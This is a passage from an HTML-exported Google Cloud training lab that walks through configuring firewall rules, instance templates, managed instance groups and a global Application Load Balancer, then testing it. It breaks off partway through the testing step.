><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"Username"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"Password"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="images\9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h2 id='task-1-configure-http-and-health-check-firewall-rules-3'><span>Task 1. Configure HTTP and health check firewall rules</span></h2><p><span>Configure firewall rules to allow HTTP traffic to the backends and TCP traffic from the Google Cloud health checker.</span></p><h3 id='create-the-http-firewall-rule-3'><span>Create the HTTP firewall rule</span></h3><p><span>Create a firewall rule to allow HTTP traffic to the backends.</span></p><ol start='' ><li><p><span>In the Cloud console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>VPC network</span></strong><span> &gt; </span><strong><span>Firewall</span></strong><span>.</span></p></li><li><p><span>Notice the existing </span><strong><span>ICMP</span></strong><span>, </span><strong><span>internal</span></strong><span>, </span><strong><span>RDP</span></strong><span>, and </span><strong><span>SSH</span></strong><span> firewall rules.</span></p><p><span>Each Google Cloud project starts with the </span><strong><span>default</span></strong><span> network and these firewall rules.</span></p></li><li><p><span>Click </span><strong><span>Create Firewall Rule</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>default-allow-http</span></td></tr><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>default</span></td></tr><tr><td style='text-align:left;' ><span>Targets</span></td><td style='text-align:left;' ><span>Specified target tags</span></td></tr><tr><td style='text-align:left;' ><span>Target tags</span></td><td style='text-align:left;' ><span>http-server</span></td></tr><tr><td style='text-align:left;' ><span>Source filter</span></td><td style='text-align:left;' ><span>IPv4 Ranges</span></td></tr><tr><td style='text-align:left;' ><span>Source IPv4 ranges</span></td><td style='text-align:left;' ><span>0.0.0.0/0</span></td></tr><tr><td style='text-align:left;' ><span>Protocols and ports</span></td><td style='text-align:left;' ><span>Specified protocols and ports, and then </span><em><span>check</span></em><span> TCP, </span><em><span>type:</span></em><span> 80</span></td></tr></tbody></table></figure></li></ol><p><span>Make sure to include the </span><strong><span>/0</span></strong><span> in the </span><strong><span>Source IPv4 ranges</span></strong><span> to specify all networks.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h3 id='create-the-health-check-firewall-rules-3'><span>Create the health check firewall rules</span></h3><p><span>Health checks determine which instances of a load balancer can receive new connections. For Application Load Balancing, the health check probes to your load balanced instances come from addresses in the ranges </span><code>130.211.0.0/22</code><span> and </span><code>35.191.0.0/16</code><span>. Your firewall rules must allow these connections.</span></p><ol start='' ><li><p><span>Still in the </span><strong><span>Firewall policies</span></strong><span> page, click </span><strong><span>Create Firewall Rule</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>default-allow-health-check</span></td></tr><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>default</span></td></tr><tr><td style='text-align:left;' ><span>Targets</span></td><td style='text-align:left;' ><span>Specified target tags</span></td></tr><tr><td style='text-align:left;' ><span>Target tags</span></td><td style='text-align:left;' ><span>http-server</span></td></tr><tr><td style='text-align:left;' ><span>Source filter</span></td><td style='text-align:left;' ><span>IPv4 Ranges</span></td></tr><tr><td style='text-align:left;' ><span>Source IPv4 ranges</span></td><td style='text-align:left;' ><code>130.211.0.0/22</code><span>, </span><code>35.191.0.0/16</code></td></tr><tr><td style='text-align:left;' ><span>Protocols and ports</span></td><td style='text-align:left;' ><span>Specified protocols and ports, and then </span><em><span>check</span></em><span> TCP</span></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> Make sure to enter the two </span><strong><span>Source IPv4 ranges</span></strong><span> one-by-one and press SPACE in between them.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Configure HTTP and health check firewall rules</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-2-configure-instance-templates-and-create-instance-groups-3'><span>Task 2. Configure instance templates and create instance groups</span></h2><p><span>A managed instance group uses an instance template to create a group of identical instances. Use these to create the backends of the Application Load Balancer.</span></p><h3 id='configure-the-instance-templates-4'><span>Configure the instance templates</span></h3><p><span>An instance template is an API resource that you use to create VM instances and managed instance groups. Instance templates define the machine type, boot disk image, subnet, labels, and other instance properties.</span></p><p><span>Create one instance template for </span><code>Region 1</code><span> and one for </span><code>Region 2</code><span>.</span></p><ol start='' ><li><p><span>In the Cloud console, go to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>Instance templates</span></strong><span>, and then click </span><strong><span>Create instance template</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Name</span></strong><span>, type </span><strong><code>Region 1</code><span>-template</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Location</span></strong><span>, Select </span><strong><span>Global</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Series</span></strong><span>, select </span><strong><span>E2</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Machine Type</span></strong><span>, select </span><strong><span>e2-micro</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Advanced Options</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Networking</span></strong><span>. Set the following value and leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Network tags</span></td><td style='text-align:left;' ><span>http-server</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>default</span></strong><span> under </span><strong><span>Network interfaces</span></strong><span>. Set the following values and leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>default</span></td></tr><tr><td style='text-align:left;' ><span>Subnetwork</span></td><td style='text-align:left;' ><span>default </span><code>Region 1</code></td></tr></tbody></table></figure><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li></ol><p><span>The network tag </span><strong><span>http-server</span></strong><span> ensures that the </span><strong><span>HTTP</span></strong><span> and </span><strong><span>Health Check</span></strong><span> firewall rules apply to these instances.</span></p><ol start='' ><li><p><span>Click the </span><strong><span>Management</span></strong><span> tab.</span></p></li><li><p><span>Under </span><strong><span>Metadata</span></strong><span>, click </span><strong><span>+ ADD ITEM</span></strong><span> and specify the following:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Key</span></th><th style='text-align:left;' ><span>Value</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>startup-script-url</span></td><td style='text-align:left;' ><span>gs://cloud-training/gcpnet/httplb/startup.sh</span></td></tr></tbody></table></figure></li></ol><p><span>The </span><code>startup-script-url</code><span> specifies a script that executes when instances are started. This script installs Apache and changes the welcome page to include the client IP and the name, region, and zone of the VM instance. Feel free to explore </span><a href='https://storage.googleapis.com/cloud-training/gcpnet/httplb/startup.sh'><span>this script</span></a><span>.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Wait for the instance template to be created.</span></p></li></ol><p><span>Now create another instance template for </span><strong><span>subnet-b</span></strong><span> by copying </span><strong><code>Region 1</code><span>-template</span></strong><span>:</span></p><ol start='' ><li><p><span>Click on </span><strong><code>Region 1</code><span>-template</span></strong><span> and then click on the </span><strong><span>+CREATE SIMILAR</span></strong><span> option from the top.</span></p></li><li><p><span>For </span><strong><span>Name</span></strong><span>, type </span><strong><code>Region 2</code><span>-template</span></strong><span>.</span></p></li><li><p><span>Ensure </span><strong><span>Location</span></strong><span> is selected </span><strong><span>Global</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Advanced Options</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Networking</span></strong><span>.</span></p></li><li><p><span>Ensure </span><strong><span>http-server</span></strong><span> is added as a </span><strong><span>network tag</span></strong><span>.</span></p></li><li><p><span>In </span><strong><span>Network interfaces</span></strong><span>, for </span><strong><span>Subnetwork</span></strong><span>, select </span><strong><span>default (</span><code>Region 2</code><span>)</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h3 id='create-the-managed-instance-groups-3'><span>Create the managed instance groups</span></h3><p><span>Create a managed instance group in </span><strong><code>Region 1</code></strong><span> and one in </span><strong><code>Region 2</code></strong><span>.</span></p><ol start='' ><li><p><span>Still in </span><strong><span>Compute Engine</span></strong><span>, click </span><strong><span>Instance groups</span></strong><span> in the left menu.</span></p></li><li><p><span>Click </span><strong><span>Create instance group</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><code>Region 1</code><span>-mig (if required, remove extra space from the name)</span></td></tr><tr><td style='text-align:left;' ><span>Instance template</span></td><td style='text-align:left;' ><code>Region 1</code><span>-template</span></td></tr><tr><td style='text-align:left;' ><span>Location</span></td><td style='text-align:left;' ><span>Multiple zones</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>Region 1</code></td></tr><tr><td style='text-align:left;' ><span>Minimum number of instances</span></td><td style='text-align:left;' ><span>1</span></td></tr><tr><td style='text-align:left;' ><span>Maximum number of instances</span></td><td style='text-align:left;' ><span>2</span></td></tr><tr><td style='text-align:left;' ><span>Autoscaling signals &gt; Click dropdown &gt; Signal type</span></td><td style='text-align:left;' ><span>CPU utilization</span></td></tr><tr><td style='text-align:left;' ><span>Target CPU utilization</span></td><td style='text-align:left;' ><span>80, click </span><strong><span>Done</span></strong><span>.</span></td></tr><tr><td style='text-align:left;' ><span>Initialization period</span></td><td style='text-align:left;' ><span>45</span></td></tr></tbody></table></figure></li></ol><p><span>Managed instance groups offer </span><strong><span>autoscaling</span></strong><span> capabilities that allow you to automatically add or remove instances from a managed instance group based on increases or decreases in load. Autoscaling helps your applications gracefully handle increases in traffic and reduces cost when the need for resources is lower. You just define the autoscaling policy and the autoscaler performs automatic scaling based on the measured load.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Now repeat the same procedure to create a second instance group for </span><strong><code>Region 2</code><span>-mig</span></strong><span> in </span><strong><code>Region 2</code></strong><span>:</span></p><ol start='' ><li><p><span>Click </span><strong><span>Create Instance group</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><code>Region 2</code><span>-mig</span></td></tr><tr><td style='text-align:left;' ><span>Instance template</span></td><td style='text-align:left;' ><code>Region 2</code><span>-template</span></td></tr><tr><td style='text-align:left;' ><span>Location</span></td><td style='text-align:left;' ><span>Multiple zones</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>Region 2</code></td></tr><tr><td style='text-align:left;' ><span>Minimum number of instances</span></td><td style='text-align:left;' ><span>1</span></td></tr><tr><td style='text-align:left;' ><span>Maximum number of instances</span></td><td style='text-align:left;' ><span>2</span></td></tr><tr><td style='text-align:left;' ><span>Autoscaling signals &gt; Click dropdown &gt; Signal type</span></td><td style='text-align:left;' ><span>CPU utilization</span></td></tr><tr><td style='text-align:left;' ><span>Target CPU utilization</span></td><td style='text-align:left;' ><span>80, click </span><strong><span>Done</span></strong><span>.</span></td></tr><tr><td style='text-align:left;' ><span>Initialization period</span></td><td style='text-align:left;' ><span>45</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Configure instance templates and instance group</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='verify-the-backends-4'><span>Verify the backends</span></h3><p><span>Verify that VM instances are being created in both regions and access their HTTP sites.</span></p><ol start='' ><li><p><span>Still in </span><strong><span>Compute Engine</span></strong><span>, click </span><strong><span>VM instances</span></strong><span> in the left menu.</span></p></li><li><p><span>Notice the instances that start with </span><code>Region 1</code><span>-mig and </span><code>Region 2</code><span>-mig.</span></p><p><span>These instances are part of the managed instance groups.</span></p></li><li><p><span>Click on the </span><strong><span>External IP</span></strong><span> of an instance of </span><code>Region 1</code><span>-mig.</span></p><p><span>You should see the </span><strong><span>Client IP</span></strong><span> (your IP address), the </span><strong><span>Hostname</span></strong><span> (starts with </span><code>Region 1</code><span>-mig) and the </span><strong><span>Server Location</span></strong><span> (a zone in </span><code>Region 1</code><span>).</span></p></li><li><p><span>Click on the </span><strong><span>External IP</span></strong><span> of an instance of </span><code>Region 2</code><span>-mig.</span></p><p><span>You should see the </span><strong><span>Client IP</span></strong><span> (your IP address), the </span><strong><span>Hostname</span></strong><span> (starts with </span><code>Region 2</code><span>-mig) and the </span><strong><span>Server Location</span></strong><span> (a zone in </span><code>Region 2</code><span>).</span></p></li></ol><p><strong><span>Note:</span></strong><span> The </span><strong><span>Hostname</span></strong><span> and </span><strong><span>Server Location</span></strong><span> identifies where the Application Load Balancer sends traffic.</span></p><p>&nbsp;</p><p><span>Which of these fields identify the region of the backend?</span></p><p>&nbsp;</p><p><span>Client IP</span></p><p>&nbsp;</p><p><span>Server Location</span></p><p>&nbsp;</p><p><span>Hostname</span></p><p>&nbsp;</p><p><span>Submit</span></p><p>&nbsp;</p><h2 id='task-3-configure-the-application-load-balancer-2'><span>Task 3. Configure the Application Load Balancer</span></h2><p><span>Configure the Application Load Balancer to balance traffic between the two backends (</span><strong><code>Region 1</code><span>-mig</span></strong><span> in </span><code>Region 1</code><span> and </span><strong><code>Region 2</code><span>-mig</span></strong><span> in </span><code>Region 2</code><span>), as illustrated in the network diagram:</span></p><p><img src="images\7wJtCqbfTFLwKCpOMzUSyPjVKBjUouWHbduOqMpfRiM%3D" referrerpolicy="no-referrer" alt="Network diagram that illustrates load balancing"></p><h3 id='start-the-configuration-5'><span>Start the configuration</span></h3><ol start='' ><li><p><span>In the Cloud console, click </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; click </span><strong><span>VIEW ALL PRODUCTS</span></strong><span> &gt; </span><strong><span>Networking</span></strong><span> &gt; </span><strong><span>Network Services</span></strong><span> &gt; </span><strong><span>Load balancing</span></strong><span>.</span></p></li><li><p><span>click </span><strong><span>Create load balancer</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>Application Load Balancer HTTP(S)</span></strong><span>, click Next.</span></p></li><li><p><span>For </span><strong><span>Public facing or internal</span></strong><span>, select </span><strong><span>Public facing (external)</span></strong><span> and click Next.</span></p></li><li><p><span>For </span><strong><span>Global or single region deployment</span></strong><span>, select </span><strong><span>Best for global workloads</span></strong><span> and click Next.</span></p></li><li><p><span>For </span><strong><span>Create load balancer</span></strong><span>, click </span><strong><span>Configure</span></strong><span>.</span></p></li><li><p><span>Set </span><strong><span>Load Balancer Name</span></strong><span> to </span><code>http-lb</code><span>.</span></p></li></ol><h3 id='configure-the-frontend-5'><span>Configure the frontend</span></h3><p><span>The host and path rules determine how your traffic will be directed. For example, you could direct video traffic to one backend and static traffic to another backend. However, you are not configuring the Host and path rules in this lab.</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Frontend configuration</span></strong><span>.</span></p></li><li><p><span>Specify the following, leaving all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Protocol</span></td><td style='text-align:left;' ><span>HTTP</span></td></tr><tr><td style='text-align:left;' ><span>IP version</span></td><td style='text-align:left;' ><span>IPv4</span></td></tr><tr><td style='text-align:left;' ><span>IP address</span></td><td style='text-align:left;' ><span>Ephemeral</span></td></tr><tr><td style='text-align:left;' ><span>Port</span></td><td style='text-align:left;' ><span>80</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add Frontend IP and port</span></strong><span>.</span></p></li><li><p><span>Specify the following, leaving all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Protocol</span></td><td style='text-align:left;' ><span>HTTP</span></td></tr><tr><td style='text-align:left;' ><span>IP version</span></td><td style='text-align:left;' ><span>IPv6</span></td></tr><tr><td style='text-align:left;' ><span>IP address</span></td><td style='text-align:left;' ><span>Auto-allocate</span></td></tr><tr><td style='text-align:left;' ><span>Port</span></td><td style='text-align:left;' ><span>80</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li></ol><p><span>Application Load Balancing supports both IPv4 and IPv6 addresses for client traffic. Client IPv6 requests are terminated at the global load balancing layer, then proxied over IPv4 to your backends.</span></p><h3 id='configure-the-backend-4'><span>Configure the backend</span></h3><p><span>Backend services direct incoming traffic to one or more attached backends. Each backend is composed of an instance group and additional serving capacity metadata.</span></p><ol start='' ><li><p><span>Click on </span><strong><span>Backend configuration</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Backend services &amp; backend buckets</span></strong><span>, click </span><strong><span>Create a backend service</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>http-backend</span></td></tr><tr><td style='text-align:left;' ><span>Instance group</span></td><td style='text-align:left;' ><code>Region 1</code><span>-mig</span></td></tr><tr><td style='text-align:left;' ><span>Port numbers</span></td><td style='text-align:left;' ><span>80</span></td></tr><tr><td style='text-align:left;' ><span>Balancing mode</span></td><td style='text-align:left;' ><span>Rate</span></td></tr><tr><td style='text-align:left;' ><span>Maximum RPS</span></td><td style='text-align:left;' ><span>50</span></td></tr><tr><td style='text-align:left;' ><span>Capacity</span></td><td style='text-align:left;' ><span>100</span></td></tr></tbody></table></figure></li></ol><p><span>This configuration means that the load balancer attempts to keep each instance of </span><strong><code>Region 1</code><span>-mig</span></strong><span> at or below 50 requests per second (RPS).</span></p><ol start='' ><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add a backend</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Instance group</span></td><td style='text-align:left;' ><code>Region 2</code><span>-mig</span></td></tr><tr><td style='text-align:left;' ><span>Port numbers</span></td><td style='text-align:left;' ><span>80</span></td></tr><tr><td style='text-align:left;' ><span>Balancing mode</span></td><td style='text-align:left;' ><span>Utilization</span></td></tr><tr><td style='text-align:left;' ><span>Maximum backend utilization</span></td><td style='text-align:left;' ><span>80</span></td></tr><tr><td style='text-align:left;' ><span>Capacity</span></td><td style='text-align:left;' ><span>100</span></td></tr></tbody></table></figure></li></ol><p><span>This configuration means that the load balancer attempts to keep each instance of </span><strong><code>Region 2</code><span>-mig</span></strong><span> at or below 80% CPU utilization.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Health Check</span></strong><span>, select </span><strong><span>Create a health check</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>http-health-check</span></td></tr><tr><td style='text-align:left;' ><span>Protocol</span></td><td style='text-align:left;' ><span>TCP</span></td></tr><tr><td style='text-align:left;' ><span>Port</span></td><td style='text-align:left;' ><span>80</span></td></tr></tbody></table></figure></li></ol><p><span>Health checks determine which instances receive new connections. This HTTP health check polls instances every 5 seconds, waits up to 5 seconds for a response and treats 2 successful or 2 failed attempts as healthy or unhealthy, respectively.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Save</span></strong><span>.</span></p></li><li><p><span>Check the </span><strong><span>Enable Logging</span></strong><span> box.</span></p></li><li><p><span>Set the </span><strong><span>Sample Rate</span></strong><span> to </span><code>1</code><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span> to create the backend service.</span></p></li><li><p><span>Click </span><strong><span>Ok</span></strong><span>.</span></p></li></ol><h3 id='review-and-create-the-application-load-balancer-2'><span>Review and create the Application Load Balancer</span></h3><ol start='' ><li><p><span>Click on </span><strong><span>Review and finalize</span></strong><span>.</span></p></li><li><p><span>Review the </span><strong><span>Backend</span></strong><span> and </span><strong><span>Frontend</span></strong><span> services.</span></p></li><li><p><span>Click on </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Wait for the load balancer to be created.</span></p></li><li><p><span>Click on the name of the load balancer (</span><strong><span>http-lb</span></strong><span>).</span></p></li><li><p><span>Note the IPv4 and IPv6 addresses of the load balancer for the next task. They will be referred to as </span><code>[LB_IP_v4]</code><span> and </span><code>[LB_IP_v6]</code><span>, respectively.</span></p></li></ol><p><strong><span>Note:</span></strong><span> The IPv6 address is the one in hexadecimal format.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Configure the Application Load Balancer</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-4-test-the-application-load-balancer-2'><span>Task 4. Test the Application Load Balancer</span></h2><p><span>Now that you created the Application Load Balancer for your backends, verify that traffic is forwarded to the backend service.</span></p><p>&nbsp;</p><p><span>The Application Load Balancer should forward traffic to the region that is closest to you.</span></p><p>&nbsp;</p><p><span>True</span></p><p>&nbsp;</p><p><span>False</span></p><p>&nbsp;</p><h3 id='access-the-application-load-balancer-2'><span>Access the Application Load Balancer</span></h3><p><span>To test IPv4 access to the Application Load Balancer, open a new tab in your browser and navigate to </span><code>http://[LB_IP_v4]</code><span>. Make sure to replace </span><code>[LB_IP_v4]</code><span> with the IPv4 address of the load balancer.</span></p><p><strong><span>Note:</span></strong><span> It might take up to 5 minutes to access the Application Load Balancer. In the meantime, you might get a 404 or 502 error. Keep trying until you see the page of one of the backends.</span></p><p><strong><span>Note:</span></strong><span> Depending on your proximity to </span><strong><code>Region 1</code></strong><span> and </span><strong><code>Region 2</code></strong><span>, your traffic is either forwarded to a </span><strong><code>Region 1</code><span>-mig</span></strong><span> or </span><strong><code>Region 2</code><span>-mig</span></strong><span> instance.</span></p><p><span>If you have a local IPv6 address, try the IPv6 address of the Application Load Balancer by navigating to 